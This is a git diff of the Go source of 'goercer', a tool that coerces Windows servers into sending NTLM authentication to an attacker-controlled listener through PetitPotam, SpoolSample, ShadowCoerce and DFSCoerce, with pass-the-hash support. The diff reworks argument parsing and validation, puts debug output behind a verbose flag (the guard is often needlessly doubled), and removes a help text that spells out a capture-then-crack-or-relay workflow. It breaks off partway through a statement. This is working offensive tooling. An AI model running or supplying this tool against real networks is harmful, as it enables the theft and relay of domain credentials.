@@ -29,6 +29,7 @@ References:
 */
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/hmac"
 	"crypto/md5"
@@ -39,13 +40,17 @@ import (
 	"fmt"
 	"net/url"
 	"os"
+	"strings"
+	"syscall"
 	"time"
 	"unicode/utf16"
 
 	"github.com/jfjallid/go-smb/smb"
 	"github.com/jfjallid/go-smb/spnego"
+	"github.com/mjwhitta/cli"
 	"golang.org/x/crypto/md4"
 	"golang.org/x/net/proxy"
+	"golang.org/x/term"
 )
 
 const (
@@ -71,6 +76,9 @@ const (
 	// SMB2 IOCTL for named pipe operations
 	//fsctlPipeTransceive = 0x0011C017
 )
+
+// Global verbose flag
+var verbose bool
 
 // NTLMAuth holds NTLM authentication state for DCERPC PKT_PRIVACY
 // This struct maintains the cryptographic state across multiple DCERPC requests.
@@ -122,120 +130,163 @@ type CoercionMethod struct {
 }
 
 func main() {
-	// Check for help flag
-	for _, arg := range os.Args[1:] {
-		if arg == "-h" || arg == "--help" {
-			fmt.Println("Goercer - NTLM Coercion Attack Tool")
-			fmt.Println("====================================\n")
-			fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe] [--proxy socks5://host:port]\n")
-			fmt.Println("Description:")
-			fmt.Println("  Coerces Windows servers to authenticate to an attacker-controlled listener,")
-			fmt.Println("  capturing machine account NTLMv2 hashes via Responder or ntlmrelayx.\n")
-			fmt.Println("Coercion Methods:\n")
-			fmt.Println("  ✅ petitpotam     (MS-EFSRPC) - Default method")
-			fmt.Println("     Success Rate: HIGH - Works on ALL Windows servers")
-			fmt.Println("     Callbacks: 1 authentication attempt")
-			fmt.Println("     Notes: Core LSARPC service always available\n")
-			fmt.Println("  ✅ spoolsample    (MS-RPRN) - Print Spooler attack")
-			fmt.Println("     Success Rate: HIGH - Works when Print Spooler is running (default on most servers)")
-			fmt.Println("     Callbacks: 3 authentication attempts (maximum coercion!)")
-			fmt.Println("     Notes: Triggers multiple callbacks via printer change notifications\n")
-			fmt.Println("  ⚠️  shadowcoerce   (MS-FSRVP) - Volume Shadow Copy")
-			fmt.Println("     Success Rate: LOW - Situational (requires VSS RPC configured)")
-			fmt.Println("     Callbacks: Varies")
-			fmt.Println("     Notes: Only works if Volume Shadow Copy Service is configured for RPC access\n")
-			fmt.Println("  ⚠️  dfscoerce      (MS-DFSNM) - DFS Namespace")
-			fmt.Println("     Success Rate: LOW - Situational (requires DFS Namespaces role installed)")
-			fmt.Println("     Callbacks: Varies")
-			fmt.Println("     Notes: Rare - most servers don't have DFS Namespaces configured\n")
-			fmt.Println("Alternative Pipes (PetitPotam only):\n")
-			fmt.Println("  lsarpc (default) - Most compatible, always available")
-			fmt.Println("  efsr             - Alternative MS-EFSRPC endpoint")
-			fmt.Println("  samr             - SAM Remote Protocol pipe")
-			fmt.Println("  netlogon         - Netlogon service pipe")
-			fmt.Println("  lsass            - Local Security Authority pipe\n")
-			fmt.Println("Examples:\n")
-			fmt.Println("  # Basic PetitPotam (recommended first attempt)")
-			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local\n")
-			fmt.Println("  # Pass-the-hash with NTLM hash")
-			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user 8846f7eaee8fb117ad06bdd830b7586c domain.local\n")
-			fmt.Println("  # PetitPotam with alternative pipe")
-			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local petitpotam efsr\n")
-			fmt.Println("  # SpoolSample (3 callbacks - best for hash capture)")
-			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local spoolsample\n")
-			fmt.Println("  # ShadowCoerce (only if VSS is configured)")
-			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local shadowcoerce\n")
-			fmt.Println("  # Use SOCKS5 proxy")
-			fmt.Println("  ./goercer 10.0.0.10 10.0.0.5 user Password123 domain.local petitpotam lsarpc --proxy socks5://127.0.0.1:1080\n")
-			fmt.Println("Arguments:\n")
-			fmt.Println("  <target_ip>    : IP address of the target server to coerce")
-			fmt.Println("  <listener_ip>  : IP address where Responder/ntlmrelayx is listening")
-			fmt.Println("  <username>     : Valid domain user (e.g., 'john' or 'DOMAIN\\\\john')")
-			fmt.Println("  <password|hash>: User's password OR NTLM hash (32 hex characters)")
-			fmt.Println("  <domain>       : Domain name (e.g., 'CORP' or 'corp.local')")
-			fmt.Println("  [method]       : Coercion method (default: petitpotam)")
-			fmt.Println("  [pipe]         : Named pipe (only for petitpotam, default: lsarpc)")
-			fmt.Println("  [--proxy URL]  : SOCKS5 proxy (e.g., socks5://127.0.0.1:1080)\n")
-			fmt.Println("Workflow:\n")
-			fmt.Println("  1. Start Responder: sudo responder -I eth0 -v")
-			fmt.Println("  2. Run goercer against target server")
-			fmt.Println("  3. Check Responder for captured NTLM hash")
-			fmt.Println("  4. Crack hash or relay to other services\n")
-			fmt.Println("Expected Output:\n")
-			fmt.Println("  [+] SMB authenticated")
-			fmt.Println("  [+] Pipe opened, starting DCERPC auth...")
-			fmt.Println("  [+] DCERPC authentication complete!")
-			fmt.Println("  [+] Opnum X got ERROR_BAD_NETPATH - coercion successful!")
-			fmt.Println("  [+] Check Responder for callback!\n")
-			fmt.Println("Troubleshooting:\n")
-			fmt.Println("  - If pipe not found: Try PetitPotam (always available) or SpoolSample")
-			fmt.Println("  - If ACCESS_DENIED: Opnum may be patched, tool will try alternate opnums")
-			fmt.Println("  - If bind rejected: Service doesn't accept PKT_PRIVACY auth (normal for DFS/VSS)")
-			fmt.Println("  - No callback in Responder: Check network connectivity and firewall rules\n")
-			os.Exit(0)
-		}
+	var (
+		target   string
+		listener string
+		username string
+		password string
+		hash     string
+		domain   string
+		method   string
+		pipe     string
+		proxyURL string
+	)
+
+	// Configure CLI
+	cli.Align = true
+	cli.Banner = "goercer [OPTIONS]"
+	cli.Info("Coerces Windows servers to authenticate to an attacker-controlled listener")
+	cli.Authors = []string{"ineffectivecoder"}
+
+	// Define flags
+	cli.Flag(&target, "t", "target", "", "Target server IP address")
+	cli.Flag(&listener, "l", "listener", "", "Listener IP for callback (Responder/ntlmrelayx)")
+	cli.Flag(&username, "u", "user", "", "Domain username")
+	cli.Flag(&domain, "d", "domain", "", "Domain name")
+	cli.Flag(&password, "p", "password", "", "Password (prompted if not provided)")
+	cli.Flag(&hash, "H", "hash", "", "NTLM hash (32 hex characters)")
+	cli.Flag(&method, "m", "method", "petitpotam", "Coercion method: petitpotam, spoolsample, shadowcoerce, dfscoerce")
+	cli.Flag(&pipe, "pipe", "lsarpc", "Named pipe (petitpotam only): lsarpc, efsr, samr, netlogon, lsass")
+	cli.Flag(&proxyURL, "proxy", "", "SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)")
+	cli.Flag(&verbose, "v", "verbose", false, "Enable verbose/debug output")
+
+	cli.Parse()
+
+	// Validate required flags
+	if target == "" || listener == "" || username == "" || domain == "" {
+		fmt.Println("[!] Error: Missing required flags")
+		fmt.Println("[!] Required: -t (target), -l (listener), -u (user), -d (domain)")
+		cli.Usage(1)
 	}
 
-	if len(os.Args) < 6 {
-		fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password|hash> <domain> [method] [pipe]")
-		fmt.Println("Methods: petitpotam (default), spoolsample, shadowcoerce, dfscoerce")
-		fmt.Println("Pipes (for petitpotam): lsarpc (default), efsr, samr, netlogon, lsass")
-		fmt.Println()
-		fmt.Println("Use -h or --help for more information")
+	// Validate IP addresses
+	if !isValidIP(target) {
+		fmt.Printf("[!] Error: Invalid target IP address: %s\n", target)
+		os.Exit(1)
+	}
+	if !isValidIP(listener) {
+		fmt.Printf("[!] Error: Invalid listener IP address: %s\n", listener)
 		os.Exit(1)
 	}
 
-	targetIP := os.Args[1]
-	listenerIP := os.Args[2]
-	username := os.Args[3]
-	password := os.Args[4]
-	domain := os.Args[5]
-	methodName := "petitpotam"
-	pipeName := "lsarpc" // Default pipe for petitpotam
-	var proxyURL string
+	// Validate method (case-insensitive)
+	method = strings.ToLower(method)
+	validMethods := []string{"petitpotam", "spoolsample", "shadowcoerce", "dfscoerce"}
+	methodValid := false
+	for _, vm := range validMethods {
+		if method == vm {
+			methodValid = true
+			break
+		}
+	}
+	if !methodValid {
+		fmt.Printf("[!] Error: Invalid method '%s'\n", method)
+		fmt.Println("[!] Valid methods: petitpotam, spoolsample, shadowcoerce, dfscoerce")
+		os.Exit(1)
+	}
 
-	// Parse optional arguments
-	for i := 6; i < len(os.Args); i++ {
-		if os.Args[i] == "--proxy" && i+1 < len(os.Args) {
-			proxyURL = os.Args[i+1]
-			i++ // Skip next arg
-		} else if i == 6 {
-			methodName = os.Args[i]
-		} else if i == 7 && os.Args[i] != "--proxy" {
-			pipeName = os.Args[i]
+	// Validate pipe name (case-insensitive)
+	pipe = strings.ToLower(pipe)
+	validPipes := []string{"lsarpc", "efsr", "samr", "netlogon", "lsass"}
+	pipeValid := false
+	for _, vp := range validPipes {
+		if pipe == vp {
+			pipeValid = true
+			break
+		}
+	}
+	if !pipeValid {
+		fmt.Printf("[!] Error: Invalid pipe name '%s'\n", pipe)
+		fmt.Println("[!] Valid pipes: lsarpc, efsr, samr, netlogon, lsass")
+		os.Exit(1)
+	}
+
+	// Warn if pipe is specified but method doesn't use it
+	if pipe != "lsarpc" && method != "petitpotam" {
+		fmt.Printf("[!] Warning: --pipe parameter only applies to 'petitpotam' method (ignored for %s)\n", method)
+	}
+
+	// Validate proxy URL format if provided
+	if proxyURL != "" {
+		if !strings.HasPrefix(proxyURL, "socks5://") {
+			fmt.Println("[!] Error: Proxy URL must start with 'socks5://'")
+			fmt.Println("[!] Example: socks5://127.0.0.1:1080")
+			os.Exit(1)
+		}
+		// Validate the host:port part
+		proxyHost := strings.TrimPrefix(proxyURL, "socks5://")
+		if !strings.Contains(proxyHost, ":") {
+			fmt.Println("[!] Error: Proxy URL must include port (e.g., socks5://127.0.0.1:1080)")
+			os.Exit(1)
 		}
 	}
 
-	// SMB connection - detect if password is actually a hash
+	// Handle authentication - prompt if neither password nor hash provided
+	if password == "" && hash == "" {
+		fmt.Print("Enter password or NTLM hash: ")
+
+		// Try to read password without echo
+		if term.IsTerminal(int(syscall.Stdin)) {
+			bytePassword, err := term.ReadPassword(int(syscall.Stdin))
+			fmt.Println() // newline after password input
+			if err != nil {
+				fmt.Printf("[!] Failed to read password: %v\n", err)
+				os.Exit(1)
+			}
+			password = string(bytePassword)
+		} else {
+			// Fallback to buffered read if not a terminal
+			reader := bufio.NewReader(os.Stdin)
+			input, err := reader.ReadString('\n')
+			if err != nil {
+				fmt.Printf("[!] Failed to read input: %v\n", err)
+				os.Exit(1)
+			}
+			password = strings.TrimSpace(input)
+		}
+
+		// Check if input is an NTLM hash
+		if isNTLMHash(password) {
+			hash = password
+			password = ""
+		}
+	}
+
+	// Validate that we have either password or hash
+	if password == "" && hash == "" {
+		fmt.Println("[!] Error: Must provide either password (-p) or NTLM hash (-H)")
+		os.Exit(1)
+	}
+
+	// Validate hash format if provided
+	if hash != "" && !isNTLMHash(hash) {
+		fmt.Printf("[!] Error: Invalid NTLM hash format: '%s'\n", hash)
+		fmt.Println("[!] Hash must be exactly 32 hexadecimal characters")
+		fmt.Println("[!] Example: 8846f7eaee8fb117ad06bdd830b7586c")
+		os.Exit(1)
+	}
+
+	// SMB connection setup
 	options := smb.Options{
-		Host: targetIP,
+		Host: target,
 		Port: 445,
 	}
 
 	// Setup SOCKS5 proxy if specified
 	if proxyURL != "" {
 		fmt.Printf("[+] Using SOCKS5 proxy: %s\n", proxyURL)
-		dialer, err := proxy.FromURL(&url.URL{Scheme: "socks5", Host: proxyURL[len("socks5://"):]}, proxy.Direct)
+		proxyHost := strings.TrimPrefix(proxyURL, "socks5://")
+		dialer, err := proxy.FromURL(&url.URL{Scheme: "socks5", Host: proxyHost}, proxy.Direct)
 		if err != nil {
 			fmt.Printf("[!] Failed to create proxy dialer: %v\n", err)
 			os.Exit(1)
@@ -243,21 +294,21 @@ func main() {
 		options.ProxyDialer = dialer
 	}
 
-	// Check if password is an NTLM hash (32 hex chars)
-	if isNTLMHash(password) {
+	// Setup authentication - use hash if provided, otherwise password
+	if hash != "" {
 		fmt.Printf("[+] Using NTLM hash (pass-the-hash)\n")
-		hash, err := hex.DecodeString(password)
+		hashBytes, err := hex.DecodeString(hash)
 		if err != nil {
 			fmt.Printf("[!] Invalid NTLM hash format\n")
 			os.Exit(1)
 		}
 		options.Initiator = &spnego.NTLMInitiator{
 			User:   username,
-			Hash:   hash,
+			Hash:   hashBytes,
 			Domain: domain,
 		}
 	} else {
-		// Use regular password authentication
+		// Use password authentication
 		options.Initiator = &spnego.NTLMInitiator{
 			User:     username,
 			Password: password,
@@ -285,36 +336,37 @@ func main() {
 	// Initialize NTLM auth state (reusable across methods)
 	auth := &NTLMAuth{
 		user:       username,
-		password:   password,
+		password:   password, // Will be empty if using hash
 		domain:     domain,
-		listenerIP: listenerIP,
+		listenerIP: listener,
 		seqNum:     0,
 	}
 
 	// Execute chosen coercion method
-	switch methodName {
+	switch method {
 	case "petitpotam":
-		err = executePetitPotam(session, share, auth, listenerIP, pipeName)
+		err = executePetitPotam(session, share, auth, listener, pipe)
 	case "spoolsample":
-		if pipeName != "lsarpc" {
+		if pipe != "lsarpc" {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for SpoolSample (only works on \\pipe\\spoolss)")
 		}
-		err = executeSpoolSample(session, share, auth, listenerIP, targetIP)
+		err = executeSpoolSample(session, share, auth, listener, target)
 	case "shadowcoerce":
-		if pipeName != "lsarpc" {
+		if pipe != "lsarpc" {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for ShadowCoerce (only works on \\pipe\\FssagentRpc)")
 		}
-		err = executeShadowCoerce(session, share, auth, listenerIP)
+		err = executeShadowCoerce(session, share, auth, listener)
 	case "dfscoerce":
-		if pipeName != "lsarpc" {
+		if pipe != "lsarpc" {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for DFSCoerce (only works on \\pipe\\netdfs)")
 		}
-		err = executeDFSCoerce(session, share, auth, listenerIP)
+		err = executeDFSCoerce(session, share, auth, listener)
 	// Future coercion methods can be added here:
 	// case "printerbug":
-	//     err = executePrinterBug(session, share, auth, listenerIP)
+	//     err = executePrinterBug(session, share, auth, listener)
 	default:
-		fmt.Printf("Unknown method: %s\n", methodName)
+		fmt.Printf("[!] Unknown method: %s\n", method)
+		fmt.Println("[!] Valid methods: petitpotam, spoolsample, shadowcoerce, dfscoerce")
 		os.Exit(1)
 	}
 
@@ -641,10 +693,18 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 	// Step 1: Send Bind with NTLM Negotiate
 	negotiateMsg := createNTLMNegotiate()
 	auth.negotiateMsg = negotiateMsg // Save for MIC calculation
-	fmt.Printf("[DEBUG] NTLM Negotiate (%d bytes): %x\n", len(negotiateMsg), negotiateMsg)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] NTLM Negotiate (%d bytes): %x\n", len(negotiateMsg), negotiateMsg)
+		}
+	}
 
 	bindReq := createDCERPCBindWithAuth(negotiateMsg, uuid, majorVer, minorVer)
-	fmt.Printf("[DEBUG] Bind packet (%d bytes): %x\n", len(bindReq), bindReq)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] Bind packet (%d bytes): %x\n", len(bindReq), bindReq)
+		}
+	}
 
 	// Use WritePipe/ReadPipe instead of IOCTL to replicate impacket approach
 	fmt.Println("[+] Sending Bind via WritePipe...")
@@ -660,12 +720,24 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 		return fmt.Errorf("bind read failed: %v", err)
 	}
 	bindAck = bindAck[:n]
-	fmt.Printf("[DEBUG] BindAck length: %d\n", len(bindAck))
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] BindAck length: %d\n", len(bindAck))
+		}
+	}
 	if len(bindAck) >= 3 {
-		fmt.Printf("[DEBUG] Packet type: %d (expected %d for BindAck)\n", bindAck[2], dcerpcBindAck)
+		if verbose {
+			if verbose {
+				fmt.Printf("[DEBUG] Packet type: %d (expected %d for BindAck)\n", bindAck[2], dcerpcBindAck)
+			}
+		}
 	}
 	if len(bindAck) >= 24 {
-		fmt.Printf("[DEBUG] First 24 bytes: %x\n", bindAck[:24])
+		if verbose {
+			if verbose {
+				fmt.Printf("[DEBUG] First 24 bytes: %x\n", bindAck[:24])
+			}
+		}
 	}
 
 	if len(bindAck) < 24 {
@@ -676,7 +748,11 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 		// BindNak format: header + reject_reason (uint16)
 		// The reject reason is in the call_id field for BindNak
 		callID := binary.LittleEndian.Uint32(bindAck[12:16])
-		fmt.Printf("[DEBUG] Full BindNak: %x\n", bindAck)
+		if verbose {
+			if verbose {
+				fmt.Printf("[DEBUG] Full BindNak: %x\n", bindAck)
+			}
+		}
 		return fmt.Errorf("bind rejected (BindNak) - call_id/reason: 0x%x", callID)
 	}
 
@@ -688,7 +764,11 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 
 	// Extract NTLM Challenge from BindAck auth trailer
 	authLen := binary.LittleEndian.Uint16(bindAck[10:12]) // auth_len is at offset 10
-	fmt.Printf("[DEBUG] auth_len = %d\n", authLen)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] auth_len = %d\n", authLen)
+		}
+	}
 
 	if authLen == 0 {
 		return fmt.Errorf("no auth data in BindAck")
@@ -696,10 +776,18 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 
 	// Auth trailer is at the end of the packet
 	fragLen := binary.LittleEndian.Uint16(bindAck[8:10])
-	fmt.Printf("[DEBUG] frag_len = %d, packet len = %d\n", fragLen, len(bindAck))
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] frag_len = %d, packet len = %d\n", fragLen, len(bindAck))
+		}
+	}
 
 	authTrailerStart := int(fragLen) - int(authLen) - 8 // 8 bytes for auth header
-	fmt.Printf("[DEBUG] Calculated authTrailerStart = %d\n", authTrailerStart)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] Calculated authTrailerStart = %d\n", authTrailerStart)
+		}
+	}
 
 	if authTrailerStart < 24 || authTrailerStart+int(authLen)+8 > int(fragLen) {
 		return fmt.Errorf("invalid auth trailer position: start=%d, authLen=%d, fragLen=%d", authTrailerStart, authLen, fragLen)
@@ -707,7 +795,11 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 
 	// Extract auth_context_id from auth trailer (bytes 4-7 of the 8-byte auth header)
 	serverAuthContextID := binary.LittleEndian.Uint32(bindAck[authTrailerStart+4 : authTrailerStart+8])
-	fmt.Printf("[DEBUG] Server returned auth_context_id: %d (0x%x)\n", serverAuthContextID, serverAuthContextID)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] Server returned auth_context_id: %d (0x%x)\n", serverAuthContextID, serverAuthContextID)
+		}
+	}
 
 	// Store it for use in subsequent authenticated requests
 	auth.authContextID = serverAuthContextID
@@ -726,7 +818,11 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 
 	// Extract challenge flags (4 bytes at offset 20)
 	challengeFlags := binary.LittleEndian.Uint32(challengeMsg[20:24])
-	fmt.Printf("[DEBUG] Challenge flags: 0x%08x\n", challengeFlags)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] Challenge flags: 0x%08x\n", challengeFlags)
+		}
+	}
 	auth.flags = challengeFlags // Store flags for Authenticate message
 
 	// Step 2: Generate NTLM Authenticate message (manual to get session keys)
@@ -734,12 +830,22 @@ func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share st
 	if authenticateMsg == nil {
 		return fmt.Errorf("failed to create authenticate message")
 	}
-	fmt.Printf("[DEBUG] Authenticate message (%d bytes): %x\n", len(authenticateMsg), authenticateMsg[:min2(100, len(authenticateMsg))])
-	fmt.Printf("[DEBUG] Calculated session keys for encryption\n")
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] Authenticate message (%d bytes): %x\n", len(authenticateMsg), authenticateMsg[:min2(100, len(authenticateMsg))])
+		}
+		if verbose {
+			fmt.Printf("[DEBUG] Calculated session keys for encryption\n")
+		}
+	}
 
 	// Step 3: Send Auth3 - according to impacket research, this DOES get an SMB Write Response
 	auth3Req := createDCERPCAuth3(auth, authenticateMsg)
-	fmt.Printf("[DEBUG] Sending Auth3 (%d bytes) via WritePipe\n", len(auth3Req))
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] Sending Auth3 (%d bytes) via WritePipe\n", len(auth3Req))
+		}
+	}
 
 	// Use WritePipe which waits for SMB Write Response (like impacket's writeFile)
 	fmt.Println("[+] Sending Auth3 via WritePipe (should get SMB Write Response)...")
@@ -823,10 +929,18 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 	if len(challengeMsg) > 48 {
 		targetInfoLen := binary.LittleEndian.Uint16(challengeMsg[40:42])
 		targetInfoOffset := binary.LittleEndian.Uint32(challengeMsg[44:48])
-		fmt.Printf("[DEBUG] Challenge targetInfo: len=%d, offset=%d, challengeLen=%d\n", targetInfoLen, targetInfoOffset, len(challengeMsg))
+		if verbose {
+			if verbose {
+				fmt.Printf("[DEBUG] Challenge targetInfo: len=%d, offset=%d, challengeLen=%d\n", targetInfoLen, targetInfoOffset, len(challengeMsg))
+			}
+		}
 		if int(targetInfoOffset)+int(targetInfoLen) <= len(challengeMsg) {
 			targetInfo = challengeMsg[targetInfoOffset : targetInfoOffset+uint32(targetInfoLen)]
-			fmt.Printf("[DEBUG] Using extracted targetInfo (%d bytes)\n", len(targetInfo))
+			if verbose {
+				if verbose {
+					fmt.Printf("[DEBUG] Using extracted targetInfo (%d bytes)\n", len(targetInfo))
+				}
+			}
 
 			// Extract hostname from targetInfo for TARGET_NAME construction
 			hostname = extractHostnameFromTargetInfo(targetInfo)
@@ -839,10 +953,16 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 	if len(hostname) > 0 {
 		targetInfo = addTargetNameToAVPairs(targetInfo, hostname)
 	}
-	fmt.Printf("[DEBUG] Added TARGET_NAME AV_PAIR to targetInfo (%d bytes total)\n", len(targetInfo))
-	fmt.Printf("[DEBUG] targetInfo hex dump (last 50 bytes): %x\n", targetInfo[len(targetInfo)-50:])
-	// Write targetInfo to file for debugging
-	os.WriteFile("/tmp/targetinfo_debug.bin", targetInfo, 0644)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] Added TARGET_NAME AV_PAIR to targetInfo (%d bytes total)\n", len(targetInfo))
+		}
+		if verbose {
+			fmt.Printf("[DEBUG] targetInfo hex dump (last 50 bytes): %x\n", targetInfo[len(targetInfo)-50:])
+		}
+		// Write targetInfo to file for debugging
+		os.WriteFile("/tmp/targetinfo_debug.bin", targetInfo, 0644)
+	}
 
 	// Calculate NTLMv2 response
 	timestamp := time.Now().UnixNano() / 100
@@ -862,8 +982,14 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 	auth.clientSignKey = calculateSignKey(auth.sessionBaseKey, true)
 	auth.clientSealKey = calculateSealKey(auth.sessionBaseKey, true)
 
-	fmt.Printf("[DEBUG] NTProofStr: %x\n", ntlmv2Resp[:16])
-	fmt.Printf("[DEBUG] SessionBaseKey: %x\n", auth.sessionBaseKey)
+	if verbose {
+		if verbose {
+			fmt.Printf("[DEBUG] NTProofStr: %x\n", ntlmv2Resp[:16])
+		}
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] SessionBaseKey: %x\n", auth.sessionBaseKey)
+	}
 
 	// Build Authenticate message manually
 	buf := new(bytes.Buffer)
@@ -879,9 +1005,15 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 	h.Write(auth.challenge)
 	h.Write(clientChallenge)
 	lmResp := append(h.Sum(nil), clientChallenge...)
-	fmt.Printf("[DEBUG] Client challenge (%d bytes): %x\n", len(clientChallenge), clientChallenge)
-	fmt.Printf("[DEBUG] LM response (%d bytes): %x\n", len(lmResp), lmResp)
-	fmt.Printf("[DEBUG] Server challenge: %x\n", auth.challenge)
+	if verbose {
+		fmt.Printf("[DEBUG] Client challenge (%d bytes): %x\n", len(clientChallenge), clientChallenge)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] LM response (%d bytes): %x\n", len(lmResp), lmResp)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] Server challenge: %x\n", auth.challenge)
+	}
 
 	// Calculate base offset: 64-byte standard header + VERSION (8) + MIC (16) if present
 	baseOffset := 64
@@ -891,7 +1023,9 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 	}
 	offset := baseOffset
 
-	fmt.Printf("[DEBUG] Base offset for payload: %d bytes\n", baseOffset)
+	if verbose {
+		fmt.Printf("[DEBUG] Base offset for payload: %d bytes\n", baseOffset)
+	}
 
 	// LM response
 	binary.Write(buf, binary.LittleEndian, uint16(len(lmResp)))
@@ -940,13 +1074,19 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 		encryptedRandomSessionKey = make([]byte, 16)
 		cipher.XORKeyStream(encryptedRandomSessionKey, exportedSessionKey)
 
-		fmt.Printf("[DEBUG] KEY_EXCH: Generated random exported session key: %x\n", exportedSessionKey)
-		fmt.Printf("[DEBUG] KEY_EXCH: Encrypted session key: %x\n", encryptedRandomSessionKey)
+		if verbose {
+			fmt.Printf("[DEBUG] KEY_EXCH: Generated random exported session key: %x\n", exportedSessionKey)
+		}
+		if verbose {
+			fmt.Printf("[DEBUG] KEY_EXCH: Encrypted session key: %x\n", encryptedRandomSessionKey)
+		}
 	} else {
 		// KEY_EXCH not negotiated: exportedSessionKey = keyExchangeKey (no encryption)
 		exportedSessionKey = keyExchangeKey
 		encryptedRandomSessionKey = []byte{} // Empty - no encrypted session key field
-		fmt.Printf("[DEBUG] NO KEY_EXCH: Using keyExchangeKey as exportedSessionKey: %x\n", exportedSessionKey)
+		if verbose {
+			fmt.Printf("[DEBUG] NO KEY_EXCH: Using keyExchangeKey as exportedSessionKey: %x\n", exportedSessionKey)
+		}
 	}
 
 	// Update our signing/sealing keys to use exportedSessionKey
@@ -961,11 +1101,21 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 	auth.clientSealHandle, _ = rc4.NewCipher(auth.clientSealKey)
 	auth.serverSealHandle, _ = rc4.NewCipher(auth.serverSealKey)
 
-	fmt.Printf("[DEBUG] Final SessionBaseKey (for MIC and crypto): %x\n", auth.sessionBaseKey)
-	fmt.Printf("[DEBUG] Final Client SignKey: %x\n", auth.clientSignKey)
-	fmt.Printf("[DEBUG] Final Client SealKey: %x\n", auth.clientSealKey)
-	fmt.Printf("[DEBUG] Final Server SignKey: %x\n", auth.serverSignKey)
-	fmt.Printf("[DEBUG] Final Server SealKey: %x\n", auth.serverSealKey)
+	if verbose {
+		fmt.Printf("[DEBUG] Final SessionBaseKey (for MIC and crypto): %x\n", auth.sessionBaseKey)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] Final Client SignKey: %x\n", auth.clientSignKey)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] Final Client SealKey: %x\n", auth.clientSealKey)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] Final Server SignKey: %x\n", auth.serverSignKey)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] Final Server SealKey: %x\n", auth.serverSealKey)
+	}
 
 	// Session key
 	binary.Write(buf, binary.LittleEndian, uint16(len(encryptedRandomSessionKey)))
@@ -999,9 +1149,15 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 		responseFlags &= ^uint32(0x00008000)
 	}
 
-	fmt.Printf("[DEBUG] Type 1 flags: 0x%08x\n", type1Flags)
-	fmt.Printf("[DEBUG] Challenge flags (auth.flags): 0x%08x\n", auth.flags)
-	fmt.Printf("[DEBUG] Response flags (Type 3): 0x%08x\n", responseFlags)
+	if verbose {
+		fmt.Printf("[DEBUG] Type 1 flags: 0x%08x\n", type1Flags)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] Challenge flags (auth.flags): 0x%08x\n", auth.flags)
+	}
+	if verbose {
+		fmt.Printf("[DEBUG] Response flags (Type 3): 0x%08x\n", responseFlags)
+	}
 	binary.Write(buf, binary.LittleEndian, responseFlags)
 
 	// Include VERSION field if NEGOTIATE_VERSION was set (8 bytes)
@@ -1028,7 +1184,9 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 
 	authenticateMsg := buf.Bytes()
 
-	fmt.Printf("[DEBUG] Authenticate message breakdown:\n")
+	if verbose {
+		fmt.Printf("[DEBUG] Authenticate message breakdown:\n")
+	}
 	fmt.Printf("  Header: 64, VERSION: %d, MIC: %d\n", 8, 16)
 	fmt.Printf("  LM response: %d bytes\n", len(lmResp))
 	fmt.Printf("  NTLM response: %d bytes\n", len(ntlmv2Resp))
@@ -1040,8 +1198,12 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 
 	// Write full authenticate message for analysis
 	os.WriteFile("/tmp/go_authenticate.bin", authenticateMsg, 0644)
-	fmt.Printf("[DEBUG] Full Authenticate message written to /tmp/go_authenticate.bin\n")
-	fmt.Printf("[DEBUG] Authenticate message hex (first 200 bytes): %x\n", authenticateMsg[:min2(200, len(authenticateMsg))])
+	if verbose {
+		fmt.Printf("[DEBUG] Full Authenticate message written to /tmp/go_authenticate.bin\n")
+	}
+	if verbose {
